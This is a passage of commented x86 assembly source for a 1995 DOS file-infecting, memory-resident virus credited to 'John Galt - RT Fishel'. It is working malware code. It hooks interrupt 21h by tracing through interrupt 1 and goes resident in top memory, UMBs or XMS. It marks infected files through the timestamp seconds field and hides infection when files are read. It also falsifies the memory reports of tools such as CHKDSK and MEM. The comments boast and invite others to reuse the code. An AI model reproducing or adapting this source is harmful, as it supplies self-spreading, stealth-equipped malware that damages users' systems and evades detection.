    sub     ax,word ptr ds:[si]                         ;allow for current file pointer position
    ja      save_head                               ;branch if header bytes to be read

not_header:
    xchg    cx,ax                               ;set header byte-count to 0

save_head:
    mov     cx,word ptr ss:[bp+10h]                     ;retrieve requested byte-count
    cmp     cx,ax                               ;compare with maximum header byte-count
    jnb     save_rest                               ;branch if requested count is larger
    mov     ax,cx                               ;set header byte-count to requested byte-count

save_rest:
    sub     cx,ax                               ;calculate requested byte-count without header
    push    cx                                  ;save requested byte-count on stack
    push    ax                                  ;save header byte-count on stack
    mov     cx,0ffffh                               ;set high file pointer position to -1
    mov     dx,offset exe_buffer-offset code_end                ;set low file pointer position to start of original header
    add     dx,word ptr ds:[si]                         ;use current position as index into original header
    call    set_efp                             ;set file pointer position
    lds     dx,dword ptr ss:[bp]                        ;retrieve buffer address
    mov     ah,3fh                              ;subfunction to read file
    pop     cx                                  ;restore header byte-count
    call    call_21h                            ;read bytes
    push    cs                                  ;save code segment on stack
    pop     ds                                  ;restore code segment from stack
    mov     word ptr ds:[si+8],ax                       ;save read byte-count
    add     dx,ax                               ;update buffer offset with read byte-count
    push    dx                                  ;save buffer offset on stack
    add     word ptr ds:[si],ax                         ;retrieve low file pointer position
    mov     dx,word ptr ds:[si]                         ;retrieve low file pointer position
    mov     cx,word ptr ds:[si+2]                       ;retrieve high file pointer position
    call    set_fp                              ;set initial file pointer position
    mov     eax,dword ptr ds:[si]                       ;retrieve file pointer position
    mov     edx,dword ptr ds:[si+4]                     ;retrieve original file size
    cmp     eax,edx                             ;check file pointer position
    jnb     quit_disinf                             ;branch if exceeding original file size
    pop     bp                                  ;restore buffer offset from stack
    xor     ecx,ecx                             ;zero ECX (only require low 16 bits)
    pop     cx                                  ;restore requested byte-count from stack
    add     eax,ecx                             ;update file pointer position
    cmp     eax,edx                             ;check file pointer position
    jbe     read_rest                               ;branch if within original file size
    sub     eax,edx                             ;calculate file overlap
    sub     cx,ax                               ;move read count into CX

read_rest:
    pop     ax                                  ;discard 2 bytes from stack
    pop     ds                                  ;restore buffer segment from stack
    mov     ah,3fh                              ;subfunction to read file
    mov     dx,bp                               ;move buffer offset into DX
    call    call_21h                            ;read file
    add     word ptr cs:[si+8],ax                       ;update read byte-count
    db      0f6h                                ;dummy operation to mask ADD and POP

quit_disinf:
    add     sp,6                                ;discard 6 bytes from stack
    pop     ds                                  ;restore buffer segment from stack

set_count:
    popa                                    ;restore all registers from stack
    mov     ax,word ptr cs:[scratch_area+8]                 ;retrieve total count of bytes read
    jmp     quit_get                            ;return from interrupt with flags set

fix_time:
    push    cx                                  ;save CX on stack
    push    dx                                  ;save DX on stack
    push    ax                                  ;save subfunction on stack
    call    check_seconds                           ;check if file already infected
    pop     ax                                  ;restore subfunction from stack
    jnz     check_time                              ;branch if file is not infected
    cmp     al,1                                ;check requested operation
    jz      check_time                              ;branch if operation is set time
    add     sp,4                                ;discard 4 bytes from stack

quit_get:
    retf    2                                   ;return from interrupt with flags set

check_time:
    pop     dx                                  ;restore DX from stack
    pop     cx                                  ;restore CX from stack
    jnz     set_time                            ;branch if file is not infected
    or      cl,1fh                              ;set all seconds fields

set_time:
    jmp     jfar_1                              ;proceed with time operation
    db      "22/07/95"                              ;welcome to the future of viruses

begin:  call    file_load                               ;save initial offset on stack

file_load:
    pop     si                                  ;calculate delta offset
    sub     si,offset file_load-offset emm_struct               ;point to absolute start of code
                                        ;only pussy programs rely on initial register values
    mov     ax,1dedh                ;one            ;call sign
    int     21h                     ;dead           ;check if resident
    cmp     ax,0feebh                   ;feeb?          ;return sign if resident
    jnz     go_resident                             ;branch if not resident

file_end:
    push    cs                                  ;save code segment on stack
    pop     ds                                  ;restore code segment from stack
    add     si,offset exe_buffer-offset emm_struct              ;point to original code
    cmp     word ptr ds:[si],"ZM"                       ;check file type
    jz      exec_exe                            ;branch if .EXE file
    mov     di,100h                             ;.COM files always start at 100h
    push    es                                  ;save PSP segment on stack
    push    di                                  ;save return address on stack
                                        ;(simulate far call)
    movsb
    movsw                                   ;restore original 3 bytes of .COM file
    jmp     fix_registers                           ;branch to restore registers

exec_exe:
    add     si,0eh                              ;point to stack segment in header
    mov     di,es                               ;move PSP segment into DI
    add     di,10h                              ;point to first allocated segment
    lodsw                                   ;retrieve stack segment
    add     ax,di                               ;relocate for actual memory segment
    xchg    dx,ax                               ;move stack segment into DX
    lodsw                                   ;retrieve stack pointer
    xchg    cx,ax                               ;move stack pointer into CX
    lodsw                                   ;skip checksum (waste of 2 bytes!)
    lodsw                                   ;retrieve instruction pointer
    xchg    bx,ax                               ;move intruction pointer into BX
    lodsw                                   ;retrieve code segment
    add     ax,di                               ;relocate for actual memory segment
    mov     ss,dx                               ;restore original stack segment
    mov     sp,cx                               ;restore original stack pointer
    push    ax                                  ;save original code segment on stack
    push    bx                                  ;save original instruction pointer on stack
                                        ;(simulate far call)
fix_registers:
    push    es                                  ;save PSP segment on stack
    pop     ds                                  ;restore PSP segment from stack
    retf                                    ;return from far call
                                        ;(execute host file code)
    db      "John Galt - RT Fishel"

;             don't be lame - add your name, but don't alter mine!

go_resident:
    mov     ax,es                               ;move PSP segment into AX
    dec     ax                                  ;point to MCB segment
    mov     ds,ax                               ;move MCB segment into DS
    xor     di,di                               ;set destination offset to 0

ife     res_umb
    mov     ax,code_resp_c                          ;paragraph count while resident
else
    mov     bp,code_resp_c                          ;paragraph count while resident
    mov     ax,5802h                            ;subfunction to get UMB link state
    int     21h                                 ;get link state
    cbw                                     ;zero AH
    push    ax                                  ;save UMB link state on stack
    mov     ax,5803h                            ;subfunction to set UMB link state
    push    ax                                  ;save subfunction on stack
    mov     bx,1                                ;add UMBs to DOS memory chain
    mov     cx,bx                               ;set loop count to 1
    int     21h                                 ;set UMB link state
    jb      fix_linkstrat                           ;branch if error
    inc     cx                                  ;set loop count to 2
    xor     al,al                               ;subfunction to get memory allocation strategy
    int     21h                                 ;get allocation strategy
    xchg    bx,ax                               ;store allocation strategy in BX
    push    bx                                  ;save allocation strategy on stack
    mov     ah,58h                              ;subfunction to set memory allocation strategy
    push    ax                                  ;save subfunction on stack
    mov     bl,40h                              ;high memory first fit
    int     21h                                 ;set memory allocation strategy
    mov     ah,48h                              ;subfunction to allocate memory
    mov     bx,bp                               ;number of paragraphs to allocate
    int     21h                                 ;allocate memory
    jb      fix_linkstrat                           ;branch if no UMBs available
    mov     es,ax                               ;move new code segment into ES
    dec     ax                                  ;point to MCB segment
    mov     ds,ax                               ;mov MCB segment into DS
    mov     word ptr ds:[di+1],8                        ;store type of memory block (DOS)
    mov     word ptr ds:[di+8],"CS"                     ;store name of memory block (system code)
                                        ;(must call it something!)
fix_linkstrat:
    pop     ax                                  ;restore subfunction from stack
    pop     bx                                  ;restore UMB link state/memory allocation strategy from stack
    pushf                                   ;save flags on stack
    int     21h                                 ;set UMB link state/memory allocation strategy
    popf                                    ;restore flags from stack
    loop    fix_linkstrat                           ;loop while count > 0
    jnb     move_code                               ;branch if no error

normal_alloc:
endif

    cmp     byte ptr ds:[di],"Z"                        ;check segment type

ife     res_umb
    jnz     file_end                            ;branch if not last block in chain
    sub     word ptr ds:[di+3],ax                       ;reduce free memory
    sub     word ptr ds:[di+12h],ax                     ;reduce system memory
else
    jnz     file_end                            ;branch if not last block in chain
    sub     word ptr ds:[di+3],bp                       ;reduce free memory
    sub     word ptr ds:[di+12h],bp                     ;reduce system memory
endif

;                  an MCB walker uses too much code,
;          just to find out if there's enough memory to go resident.
;                if it's the last block in the chain,
;            there's almost certainly enough memory to go resident.

    mov     es,word ptr ds:[di+12h]                     ;move new top of system memory into ES

move_code:
    mov     cx,code_word_c                          ;number of words to move
    db      2eh                                 ;CS:
                                        ;(to avoid having to alter DS)
    repz    movsw                               ;move code to top of system memory
    push    es                                  ;save destination code segment on stack
    push    offset fhook_interrupts-offset emm_struct               ;save destination offset on stack
                                        ;(simulate far call)
                                        ;(say that slowly, so as to not offend)
    retf                                    ;return from far call
                                        ;(continue execution at top of free memory)
fhook_interrupts:
    push    cs                                  ;save code segment on stack
    pop     ds                                  ;restore code segment from stack
    mov     byte ptr ds:[offset cmp_subfn-offset emm_struct+2],cl       ;zero subfunction number
    push    cx                                  ;save 0 on stack

ife     res_umb
;       the following is required to set CX to the correct toggle value,
;              in case you've set a new bit-value for int12h_flag

  ife     int12h_flag-1
    inc     cx                                  ;set toggle switches...
  else
    mov     cl,int12h_flag                          ;set toggle switches...
  endif
else
  ife     useumb_flag-1
    inc     cx                                  ;set toggle switches...
    mov     ax,cs                               ;move code segment into AX
    cmp     ah,0a0h                             ;check top of free memory segment
    adc     cx,cx                               ;set toggle to allow for UMB use
  else
    mov     cl,int12h_flag                          ;set toggle switches...
    mov     ax,cs                               ;move code segment into AX
    cmp     ah,0a0h                             ;check top of free memory segment
    jb      set_toggle                              ;branch if code not loaded in UMBs
    add     cl,useumb_flag                          ;set toggle to allow for UMB use

set_toggle:
  endif
endif

    mov     byte ptr ds:[di+toggle_byte-header_buffer],cl           ;interrupt 12h already hooked,
                                        ;interrupt 21h not executing
;                    After DOS has loaded,
;             reducing the value returned by interrupt 12h
;              will NOT reduce the available free memory!
;   Therefore, code stored here will be overwritten when COMMAND.COM reloads

    pop     ds                                  ;set DS to 0
    mov     si,4                                ;offset of interrupt 1 in interrupt table
    push    dword ptr ds:[si]                           ;save original address on stack
    mov     word ptr ds:[si],offset new_1-offset emm_struct         ;store new offset
    lodsw                                   ;skip 2 bytes in source
    mov     word ptr ds:[si],cs                         ;store new code segment
    les     bx,dword ptr ds:[si+7eh]                    ;retrieve address of interrupt 21h handler
    push    es                                  ;save original segment on stack
    push    bx                                  ;save original offset on stack
    pop     dword ptr cs:[offset jfar_21h-offset begin+1]           ;retrieve original address from stack
    mov     ah,51h      ;the operation must have bit 8 (of AX) set      ;retrieve current default drive
                                        ;(dummy call to invoke interrupt 21h)
;                this call does not use any DOS stacks,
;        therefore it can be called even in another interrupt 21h call

    pushf                                   ;save flags on stack
    push    cs                                  ;save code segment on stack
    push    offset hook21h_cont-offset emm_struct               ;save offset on stack
                                        ;(simulate interrupt call)
call_int1:
    push    ax                                  ;save flags (but with T flag set) on stack
    push    es                                  ;save interrupt handler code segment on stack
    push    bx                                  ;save interrupt handler offset on stack
                                        ;(simulate interrupt call)
new_1:  push    ds                                  ;save DS on stack
    push    es                                  ;save ES on stack
    pusha                                   ;save all registers on stack
    mov     bp,sp                               ;point to current top of stack
    mov     si,19h                              ;offset of flags in stack
    lds     di,dword ptr ss:[bp+si-5]                       ;retrieve address of next instruction
    mov     eax,dword ptr ds:[di]                       ;retrieve next instruction
    cmp     al,0cfh                             ;check instruction
    jz      set_flags                               ;branch if IRET
    cmp     al,9dh                              ;check instruction
    jnz     check_subfn                             ;branch if not POPF
    lodsw                                   ;point to flags to pop in stack

set_flags:
    or      byte ptr ss:[bp+si],1                       ;set trace flag in flags in stack
    jmp     quit_1                              ;continue with trace

check_subfn:
    cmp     eax,776cfc80h                           ;check instruction
    jnz     quit_1                              ;branch if not CMP AH,6C JA
    mov     dword ptr cs:[offset cmp_subfn-offset emm_struct],eax       ;save subfunction
    push    ds                                  ;save DS on stack
    pop     es                                  ;restore ES from stack
    mov     al,0eah                             ;set operation to far jump
    stosb                                   ;store far jump

ife     xms_swap
    xor     ax,ax                               ;offset of new interrupt 21h handler
else
    mov     ax,offset int21h_subfn-offset emm_struct            ;offset of new interrupt 21h handler
endif

    stosw                                   ;store new offset
    mov     al,byte ptr ds:[di+1]                       ;retrieve branch size
    cbw                                     ;convert to word
    xchg    si,ax                               ;store branch size in SI
    mov     ax,cs                               ;save CS in AX
    stosw                                   ;store new code segment
    push    cs                                  ;save CS on stack
    pop     es                                  ;restore ES from stack
    add     si,di                               ;calculate offset of branch
    xchg    di,ax                               ;store new offset in DI
    mov     di,offset jfar_1-offset emm_struct+1                ;offset of first far jump
    stosw                                   ;store new offset
    mov     ax,ds                               ;save original code segment in AX
    stosw                                   ;store original code segment
    xchg    si,ax                               ;store branch offset in AX
    inc     di                                  ;skip 1 byte in destination
    stosw                                   ;store new offset
    mov     ax,ds                               ;save original code segment in AX
    stosw                                   ;store original code segment
    add     word ptr ss:[bp+14h],5                      ;skip next instruction

quit_1: popa                                    ;restore all registers from stack
    pop     es                                  ;restore ES from stack
    pop     ds                                  ;restore DS from stack

known_iret:
    iret                                    ;return from interrupt

hook21h_cont:
    push    cs                                  ;save code segment on stack
    pop     es                                  ;restore code segment from stack
    mov     word ptr ds:[si-2],offset known_iret-offset emm_struct      ;disable interrupt 1 handler
    push    ds                                  ;save DS on stack
    popf                                    ;clear T flag
    pop     dword ptr ds:[si-2]                         ;restore interrupt 1 offset from stack

if      xms_swap
    mov     ax,4300h                            ;subfunction to check installation of XMS driver
    int     2fh                                 ;check installation of XMS driver
    test    al,al                               ;check result
    jns     hook_end                            ;branch if drive not installed
    mov     ax,4310h                            ;subfunction to get driver address
    int     2fh                                 ;get driver address
    push    cs                                  ;save CS on stack
    pop     ds                                  ;restore CS from stack
    xor     si,si                               ;point to EMM structure
    mov     word ptr ds:[si+offset emm_source-offset emm_struct+2],ds       ;save source segment in structure
    mov     word ptr ds:[si+offset jfar_xms-offset emm_struct+1],bx     ;save driver offset in swap code
    mov     word ptr ds:[si+offset jfar_xms-offset emm_struct+3],es     ;save driver segment in swap code
    push    ds                                  ;save DS on stack
    pop     es                                  ;restore DS from stack
    mov     ah,9                                ;subfunction to allocate extended memory block
    mov     dx,(total_byte_c+3ffh)/400h                     ;total extended memory in KB
    call    dword ptr ds:[si+offset jfar_xms-offset emm_struct+1]       ;allocate extended memory block
    dec     ax                                  ;check status
    jnz     hook_end                            ;branch if allocation failed
    mov     word ptr ds:[si+offset emm_thandle-offset emm_struct],dx    ;save handle for memory block in swap code
    mov     ah,0bh                              ;subfunction to move extended memory block
    call    dword ptr ds:[si+offset jfar_xms-offset emm_struct+1]       ;move extended memory block
    push    offset rehook_21h-offset emm_struct                 ;save offset on stack
                                        ;(simulate subroutine call)
swap_info:
    lodsd                                   ;skip 4 bytes in source
    lodsw                                   ;skip 2 bytes in source
    xchg    ax,word ptr ds:[si+offset emm_thandle-offset emm_source]    ;exchange source handle with destination handle
    mov     word ptr ds:[si+offset emm_shandle-offset emm_source],ax    ;store new source handle
    lodsd                                   ;load address of source block
    xchg    eax,dword ptr ds:[si+offset emm_target-offset emm_thandle]      ;exchange source block address with destination block address
    mov     dword ptr ds:[si-4],eax                     ;store new source block address
    ret                                     ;return from subroutine

rehook_21h:
    lds     bx,dword ptr ds:[offset jfar_1-offset emm_struct+1]         ;retrieve address of original interrupt 21h handler
    mov     word ptr ds:[bx-4],offset restore-offset emm_struct         ;store new offset of interrupt 21h handler

hook_end:
endif

    xor     si,si                               ;zero SI
    push    offset file_end-offset emm_struct                   ;save offset on stack

test_int12h:
    push    offset save_psp-offset emm_struct                   ;save return address on stack

get_psp:mov     ah,51h                              ;subfunction to retrieve PSP segment
    jmp     call_21h                            ;retrieve PSP segment

save_psp:
    mov     ds,bx                               ;move PSP segment into DS

if      res_umb
    test    byte ptr cs:[toggle_byte],useumb_flag               ;check where code is loaded
    jz      int12h_seg                              ;branch if code loaded high
endif

    mov     ax,160ah                            ;subfunction to get windows version
    int     2fh                                 ;get windows version
    test    ax,ax                               ;check windows status
    jz      int12h_seg                              ;branch if windows executing
    add     word ptr ds:[2],code_resp_c                     ;restore top of free memory

;             programs that use the top of memory value in the PSP
;          (which has just been restored to implement memory stealth)
;              will crash the machine, unless Windows is running.
;                      examples include:
;               PKWARE Inc's PKLITE v0.anything
;                   Borland's TLINK

;  this is not a problem if the code is loaded high, or from a device driver
; this form of stealth does fool CHKDSK and MEM, so you should leave it there

int12h_seg:
    push    ds                                  ;save PSP segment on stack
    pop     es                                  ;restore PSP segment from stack

int12h_ret:
    ret                                     ;return from subroutine

exe_buffer:
if      stub_exe
    db      "MZ"
    dw      (offset emm_struct-offset stub) and 1ffh
    dw      (offset emm_struct-offset stub+1ffh)/200h
    dw      0
    dw      2
    dw      0
    dw      0ffffh
    dw      0fff0h
    dw      0fffeh
    db      "GM"
    dw      100h
    dw      0fff0h
else
    int     20h
    db      0
    db      15h dup (0)
endif

code_end:


;                         DATA
;              used while resident, not present in infected files
;                   size = 57 bytes

header_buffer   equ     (offset $-offset emm_struct+1) and 0fffeh
           ;db      18h dup (0)                         ;area to contain original file header during infection

scratch_area    equ     header_buffer+18h
           ;db      0ah dup (0)                         ;scratch area for infection and disinfection

toggle_byte     equ     scratch_area+0ah
           ;db      0                               ;toggle switch

total_end       equ     toggle_byte+1

end     stub
